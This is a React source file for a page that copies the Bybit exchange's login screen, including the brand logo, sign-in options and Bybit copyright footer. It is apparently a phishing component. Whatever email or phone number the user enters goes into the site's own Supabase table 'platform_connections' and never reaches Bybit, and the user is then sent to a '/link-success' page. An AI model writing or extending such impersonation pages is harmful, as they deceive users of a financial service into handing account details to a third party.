import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Search, Menu, ChevronRight, Headphones } from 'lucide-react';
import { supabase } from '../../lib/supabase';

export default function BybitConnect() {
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState('Email');
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [credentials, setCredentials] = useState({
    email: '',
  });

  const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
    setCredentials((current) => ({ ...current, [field]: event.target.value }));
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    const { email } = credentials;
    if (!email) {
      setErrorMessage('Please enter your email.');
      return;
    }

    setLoading(true);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      const { error } = await supabase.from('platform_connections').insert({
        platform: 'Bybit',
        email,
        user_id: session?.user?.id || null
      });
      if (error) throw error;
      navigate('/link-success');
    } catch (err: any) {
      setErrorMessage(err.message || 'An unexpected error occurred.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-white text-[#121212] font-sans flex flex-col">
      {/* Header */}
      <header className="h-[56px] px-4 flex items-center justify-between border-b border-gray-100">
        <div className="flex items-center">
          <span className="text-[22px] font-black tracking-tighter italic">BYB<span className="text-[#ff9d00]">I</span>T</span>
        </div>
        <div className="flex items-center gap-5">
          <Search className="w-[22px] h-[22px] text-gray-700" />
          <button className="bg-[#ff9d00] text-black px-4 py-1.5 rounded-md text-[14px] font-bold">Sign Up</button>
          <Menu className="w-[22px] h-[22px] text-gray-700" />
        </div>
      </header>

      {/* Content */}
      <div className="flex-1 px-5 pt-10 max-w-[480px] mx-auto w-full">
        <div className="flex justify-between items-center mb-2">
          <h1 className="text-[24px] font-bold">Welcome to Bybit</h1>
        </div>
        <div className="flex items-center gap-1 mb-10">
          <span className="text-[14px] text-gray-500">No account yet?</span>
          <button className="text-[14px] font-bold text-[#ff9d00] flex items-center">
            Sign up <ChevronRight className="w-4 h-4" />
          </button>
        </div>

        {/* Tabs */}
        <div className="flex gap-8 mb-8 border-b border-gray-100">
          {['Email', 'Mobile'].map(tab => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`pb-3 text-[16px] font-bold transition-colors relative ${activeTab === tab ? 'text-[#121212]' : 'text-gray-400'}`}
            >
              {tab}
              {activeTab === tab && <div className="absolute bottom-0 left-0 w-full h-[3px] bg-[#ff9d00] rounded-full" />}
            </button>
          ))}
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-4">
            <div className="relative">
              <input
                type={activeTab === 'Email' ? 'text' : 'tel'}
                value={credentials.email}
                onChange={handleFieldChange('email')}
                placeholder={activeTab === 'Email' ? 'Email' : 'Mobile'}
                className="w-full h-[52px] border-none rounded-lg px-4 text-[16px] outline-none focus:ring-1 focus:ring-[#ff9d00] bg-[#f2f3f5] placeholder:text-gray-400"
              />
              {credentials.email && (
                <button 
                  type="button" 
                  onClick={() => setCredentials(c => ({ ...c, email: '' }))}
                  className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 bg-gray-300 rounded-full flex items-center justify-center text-white text-[10px]"
                >
                  ✕
                </button>
              )}
            </div>
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full h-[52px] bg-[#ff9d00] hover:bg-[#e68d00] text-black font-bold text-[16px] rounded-lg transition-colors mt-2"
          >
            {loading ? 'Connecting...' : 'Next'}
          </button>

          <button
            type="button"
            className="w-full h-[52px] border border-gray-200 rounded-lg text-[16px] font-bold hover:bg-gray-50 transition-colors"
          >
            Log in with passkey
          </button>

          <div className="flex flex-col items-center gap-6 pt-4">
            <div className="flex items-center gap-3 w-full">
              <div className="h-px flex-1 bg-gray-100" />
              <span className="text-[13px] text-gray-400">or log in with</span>
              <div className="h-px flex-1 bg-gray-100" />
            </div>
            <div className="flex gap-10">
              <button type="button" className="w-11 h-11 rounded-lg border border-gray-100 flex items-center justify-center bg-white shadow-sm">
                <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-6 h-6" />
              </button>
              <button type="button" className="w-11 h-11 rounded-lg border border-gray-100 flex items-center justify-center bg-white shadow-sm">
                <img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className="w-6 h-6" />
              </button>
              <button type="button" className="w-11 h-11 rounded-lg border border-gray-100 flex items-center justify-center bg-white shadow-sm">
                <img src="/logos/telegram-svgrepo-com.svg" alt="Telegram" className="w-6 h-6" />
              </button>
            </div>
          </div>

          <div className="pt-12 text-center">
            <button type="button" className="text-[15px] font-bold text-[#ff9d00] flex items-center justify-center gap-1 mx-auto">
              Log in with Subaccount <ChevronRight className="w-4 h-4" />
            </button>
          </div>
        </form>
      </div>

      {/* Footer */}
      <footer className="mt-auto py-8 flex flex-col items-center gap-4 relative">
        <div className="absolute bottom-10 right-6 w-14 h-14 rounded-full bg-[#ff9d00] flex items-center justify-center text-black shadow-xl cursor-pointer">
          <Headphones className="w-7 h-7" />
        </div>
        <p className="text-[12px] text-gray-400">© 2018-2026 Bybit.com. All rights reserved.</p>
      </footer>
    </main>
  );
}
